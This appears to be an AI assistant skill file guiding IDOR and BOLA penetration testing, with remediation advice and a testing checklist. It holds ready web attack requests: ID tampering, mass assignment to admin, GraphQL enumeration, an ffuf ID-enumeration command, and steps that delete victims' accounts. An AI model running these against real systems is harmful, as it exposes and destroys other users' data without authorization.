---
name: idor
description: >
  Expert guidance for finding, exploiting, and remediating Insecure Direct Object Reference (IDOR)
  vulnerabilities. Covers horizontal and vertical privilege escalation, parameter tampering, mass
  assignment, UUID/GUID prediction, chained IDOR, GraphQL IDOR, and blind IDOR. Use this skill
  whenever the user mentions IDOR, BOLA (Broken Object Level Authorization), object reference
  manipulation, changing user IDs in requests, accessing other users' data, horizontal privilege
  escalation, or parameter tampering to access unauthorized resources. Also trigger for "how do I
  find IDOR", "test for BOLA", "access another user's files", "change user_id in API", "UUID IDOR
  bypass". Always use this skill for any object/resource access control testing, even casual questions.
---

# IDOR Skill — Insecure Direct Object Reference Testing

IDOR (also called BOLA in OWASP API Top 10) occurs when an app uses user-controllable input to
access objects without verifying the requester is authorized to access that object.

---

## 1. Attack Surface Map — Start Here

| Scenario | Section |
|----------|---------|
| URL path IDs (`/user/123/profile`) | §3.1 |
| Query parameter IDs (`?user_id=123`) | §3.2 |
| POST body / JSON body IDs | §3.3 |
| File / document access | §3.4 |
| Horizontal → Vertical escalation | §3.5 |
| UUID / GUID / non-sequential IDs | §3.6 |
| Blind IDOR (no visible response) | §3.7 |
| GraphQL IDOR | §3.8 |
| Mass assignment IDOR | §3.9 |
| Chained IDOR (multi-step) | §3.10 |

---

## 2. Core Concepts

- **Horizontal IDOR** — Access another user's resource at the same privilege level (user A reads user B's data).
- **Vertical IDOR** — Access a higher-privilege resource (regular user reads admin data).
- **BOLA** — OWASP API Security Top 10 #1; same concept, API-focused naming.
- **Direct reference** — App uses `id=123` directly in a DB query without authorization check.
- **Indirect reference** — App maps a token to an internal ID; less common, harder to exploit.

---

## 3. Attack Techniques

### 3.1 URL Path IDOR

```
# Original request (your account)
GET /api/users/1337/profile

# Test: replace with another user's ID
GET /api/users/1338/profile
GET /api/users/1/profile        ← admin?
GET /api/users/0/profile

# Try other objects:
GET /api/orders/5001/invoice
GET /api/documents/9982/download
GET /api/messages/thread/441
```

**Methodology:**
1. Identify your own ID from any response (profile page, JWT, cookie decode)
2. Note that ID and try ±1, ±2, known IDs from the app
3. Try `0`, negative numbers, very large numbers, admin IDs

---

### 3.2 Query Parameter IDOR

```
# Modify user_id, account_id, profile_id, order_id, etc.
GET /dashboard?user_id=1337     → change to 1338
GET /report?account_id=5000     → change to 5001
GET /export?customer=CUST-001   → change to CUST-002

# Common parameter names to fuzz:
id, user_id, uid, account_id, profile_id, order_id, invoice_id,
doc_id, file_id, message_id, thread_id, customer_id, org_id, team_id
```

---

### 3.3 POST/PUT Body IDOR

```json
// Original request
POST /api/update-profile
{"user_id": 1337, "email": "attacker@evil.com"}

// Test: change user_id
{"user_id": 1338, "email": "attacker@evil.com"}

// GET another user's data via POST
POST /api/get-invoice
{"invoice_id": "INV-1000"}   → try INV-999, INV-1001
```

---

### 3.4 File / Document IDOR

```
# Direct file path references
GET /files/download?file=report_user1337.pdf
→ try report_user1338.pdf, report_admin.pdf

# Path traversal hybrid
GET /files/download?file=../1338/report.pdf

# Static file IDOR (no auth middleware on /uploads/)
https://target.com/uploads/invoices/INV-1000.pdf   → try INV-999.pdf
https://target.com/exports/user_1337_data.csv      → try user_1338_data.csv
```

---

### 3.5 Horizontal → Vertical Escalation

```
# Step 1: Find admin user IDs
# - Check /api/users/ (if enumerable)
# - Look for user_id=1, user_id=0
# - Source code, JS files, error messages leaking admin ID

# Step 2: Access admin endpoints with admin's ID
GET /api/users/1/settings       ← admin settings
GET /api/admin/reports?user=1
PUT /api/users/1/role           {"role": "admin"}

# Step 3: Replace your session cookie + admin's user_id in body
# Some apps check session for auth but use body ID for data access
```

---

### 3.6 UUID / GUID IDOR Bypass

UUIDs look unpredictable but may be guessable if:
- Sequential UUIDs (UUID v1 uses timestamp)
- Leaked in other API responses, emails, or JS files
- Predictable based on timestamp + MAC

```bash
# Decode UUID v1 to extract timestamp
python3 -c "
import uuid
u = uuid.UUID('550e8400-e29b-11d4-a716-446655440000')
print('Version:', u.version)
if u.version == 1:
    import datetime
    ts = (u.time - 0x01b21dd213814000) / 1e7
    print('Timestamp:', datetime.datetime.fromtimestamp(ts))
"

# Enumerate UUIDs from API responses
# Check: error messages, email links, activity logs, JS files
grep -rE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' response.html
```

---

### 3.7 Blind IDOR Detection

When the server returns the same response regardless:
- **Timing difference** — legitimate ID responds faster (DB hit) vs unknown ID
- **Side-channel** — trigger an action (email send, SMS) and verify with victim account
- **State change** — DELETE request: check if victim's resource was deleted

```bash
# Timing-based blind IDOR
time curl -s "https://target.com/api/user/1337/data" -H "Auth: attacker-token"
time curl -s "https://target.com/api/user/9999999/data" -H "Auth: attacker-token"
# Different response times = ID exists

# Side-channel: trigger password reset for another user
POST /api/forgot-password
{"user_id": 1338}   # does victim receive an email?
```

---

### 3.8 GraphQL IDOR

```graphql
# Direct object access by ID
query {
  user(id: "1338") {
    email
    phone
    address
    paymentMethods { cardNumber }
  }
}

# Introspect to find all queryable types
query {
  __schema {
    types { name fields { name } }
  }
}

# Batch IDOR — enumerate many IDs at once
query {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
}
```

---

### 3.9 Mass Assignment IDOR

```json
// App accepts extra fields it shouldn't
// Original signup:
POST /api/register
{"username": "attacker", "email": "a@evil.com", "password": "test"}

// Add privileged fields:
{"username": "attacker", "email": "a@evil.com", "password": "test",
 "role": "admin", "is_verified": true, "account_balance": 99999,
 "user_id": 1}

// Update profile — add fields not in the form:
PUT /api/profile
{"name": "Attacker", "role": "admin", "is_admin": true}
```

---

### 3.10 Chained IDOR

Multi-step: IDOR in step 1 leaks an ID used in step 2.

```
Step 1: GET /api/invoices?order_id=1337
        → Response leaks: {"invoice_id": "INV-9842", "customer_id": 5001}

Step 2: Use leaked customer_id in another endpoint:
        GET /api/customers/5001/payment-methods
        DELETE /api/customers/5001/account
```

---

## 4. Automation with Burp Suite

1. **Burp Intruder** — Set ID parameter as payload position, use number list 1–9999
2. **Autorize extension** — Auto-replaces session cookie with low-priv cookie, flags 200 responses
3. **Param Miner** — Discover hidden parameters that accept object IDs

```bash
# ffuf for numeric ID enumeration
ffuf -u "https://target.com/api/users/FUZZ/profile" \
     -w <(seq 1 10000) \
     -H "Authorization: Bearer ATTACKER-TOKEN" \
     -mc 200 \
     -fc 404,403 \
     -t 30

# Save results
-o idor_results.json -of json
```

---

## 5. IDOR in HTTP Methods

```
# App might protect GET but not other methods
GET    /api/user/1338/address    → 403
POST   /api/user/1338/address    → 200?
DELETE /api/user/1338/address    → 200?

# HTTP method override headers
POST /api/user/1338/delete
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
_method=DELETE   (in body)
```

---

## 6. Impact Escalation

| Finding | Escalate To |
|---------|------------|
| Read another user's profile | Harvest PII — report as high |
| Read payment/financial data | Critical — PCI scope |
| Modify another user's data | Account takeover |
| Delete another user's resource | DoS / data destruction |
| Access admin ID's data | Full admin compromise |
| Mass assignment to admin role | Complete privilege escalation |

---

## 7. Remediation

1. **Server-side authorization check** on every object access — verify `session.user_id == resource.owner_id`
2. **Never trust client-supplied IDs** for access decisions alone
3. **Use indirect references** — map random tokens to internal IDs per session
4. **Centralized authorization library** — not inline checks scattered in code
5. **Log all object access** — alert on anomalous cross-user patterns

---

## 8. IDOR Testing Checklist

- [ ] Identify all your own object IDs (profile, orders, files, messages)
- [ ] Map all endpoints that accept IDs (path, query, body, headers)
- [ ] Create two test accounts; verify Account A cannot access Account B's objects
- [ ] Test every HTTP method on each object endpoint
- [ ] Try ID=1, ID=0, ID=-1, very large IDs, admin IDs
- [ ] Check UUIDs — decode version, search for leaks
- [ ] Inspect JS files for hidden API endpoints with ID parameters
- [ ] Test mass assignment on every POST/PUT endpoint
- [ ] Check GraphQL for per-object authorization
- [ ] Verify blind IDOR with timing / side-channel
